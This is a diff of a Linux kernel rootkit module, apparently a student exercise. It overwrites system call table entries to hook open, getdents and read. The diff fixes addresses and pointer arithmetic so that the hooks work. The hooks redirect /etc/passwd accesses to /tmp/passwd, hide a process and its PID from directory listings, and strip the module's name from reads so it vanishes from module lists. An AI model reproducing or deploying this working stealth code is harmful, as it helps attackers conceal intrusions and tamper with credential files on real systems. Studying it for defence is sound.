@@ -50,13 +50,13 @@ char* itoa(int val, int base){
 //Grep for "set_pages_ro" and "set_pages_rw" in:
 //      /boot/System.map-`$(uname -r)`
 //      e.g. /boot/System.map-4.4.0-116-generic
-void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
-void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;
+void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81073190;
+void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81073110;
 
 //This is a pointer to the system call table in memory
 //Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
 //We're getting its adddress from the System.map file (see above).
-static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
+static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00280;
 
 //Function pointer will be used to save address of original 'open' syscall.
 //The asmlinkage keyword is a GCC #define that indicates this function
@@ -73,7 +73,7 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
     char targetPath[] = "/tmp/passwd";
     if (strstr(pathname, originalPath) != NULL)
     {
-        copy_to_user(pathname, targetPath, strlen("/tmp/passwd\0"));
+      copy_to_user((void*)pathname, targetPath, strlen(pathname));
     }
 
     return original_call(pathname, flags);
@@ -88,17 +88,17 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
     char* pidString;
     pidString = itoa(pid, 10);
     int currNum = 0;
-    for (currNum; currNum < originalRes;)
+    while (currNum < originalRes)
     {
-        struct linux_dirent *tmp = dirp + currNum;
+      struct linux_dirent *tmp =(void*) dirp + currNum;
         int currSize = tmp->d_reclen;
         if (strcmp(tmp->d_name, pidString) == 0 || strcmp(tmp->d_name, "sneaky_process") == 0)
         {
-            int leftNum = originalRes - currSize - currNum;
-            struct linux_dirent *next = tmp + currSize;
-            memmove(tmp, next, leftNum);
-            originalRes = originalRes - currSize;
-        }
+	  int leftNum = ((void*)dirp + originalRes) - ((void*)tmp + currSize);
+	  struct linux_dirent *next = (void*)tmp + currSize;
+	  memmove(tmp, next, leftNum);
+	  originalRes = originalRes - currSize;
+	}
         else
         {
             currNum = currNum + currSize;
@@ -114,6 +114,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count)
 {
     ssize_t originalRes = original_read(fd, buf, count);
     char *start, end;
+    if (originalRes > 0) {
     if ((start = strstr(buf, "sneaky_mod")) != NULL)
     {
         if ((end = strchr(start, '\n')) != NULL)
@@ -121,6 +122,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count)
             memmove(start, end + 1, originalRes + buf - end - 1);
             originalRes = originalRes - end - 1 + start;
         }
+    }
     }
     return originalRes;
 }
@@ -151,7 +153,7 @@ static int initialize_sneaky_module(void)
     *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
     original_read = (void *)*(sys_call_table + __NR_read);
     *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
-
+    
     //Revert page to read-only
     pages_ro(page_ptr, 1);
     //Turn write protection mode back on
@@ -181,7 +183,7 @@ static void exit_sneaky_module(void)
 
     *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
     *(sys_call_table + __NR_read) = (unsigned long)original_read;
-
+    
     //Revert page to read-only
     pages_ro(page_ptr, 1);
     //Turn write protection mode back on
@@ -190,4 +192,4 @@ static void exit_sneaky_module(void)
 
 module_init(initialize_sneaky_module); // what's called upon loading
 module_exit(exit_sneaky_module);       // what's called upon unloading
-MODULE_LICENSE("GPL");
+//MODULE_LICENSE("GPL");
